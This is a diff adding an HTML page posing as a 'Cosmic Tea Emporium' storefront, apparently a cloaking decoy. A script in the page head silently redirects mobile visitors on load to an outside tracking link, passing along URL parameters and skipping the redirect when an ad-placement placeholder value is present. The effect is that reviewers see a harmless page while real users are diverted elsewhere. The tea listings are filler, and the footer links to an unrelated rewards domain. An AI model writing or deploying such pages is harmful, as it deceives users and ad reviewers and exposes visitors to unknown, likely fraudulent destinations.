@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Tea Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        .tea-item {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.5);
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #00ffff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Tea Emporium</h1>
+    </header>
+    <div class="container">
+        <div class="tea-item">
+            <h2>Nebula Oolong</h2>
+            <p>A celestial blend of star-dusted leaves</p>
+        </div>
+        <div class="tea-item">
+            <h2>Supernova Green</h2>
+            <p>Explosive flavor in every sip</p>
+        </div>
+        <div class="tea-item">
+            <h2>Black Hole Brew</h2>
+            <p>So dark, light can't escape its flavor</p>
+        </div>
+        <div class="tea-item">
+            <h2>Martian Mint</h2>
+            <p>Out-of-this-world refreshment</p>
+        </div>
+        <div class="tea-item">
+            <h2>Asteroid Earl Grey</h2>
+            <p>A classic with a meteoric twist</p>
+        </div>
+        <div class="tea-item">
+            <h2>Lunar Lemon</h2>
+            <p>Citrusy notes from the far side of the moon</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
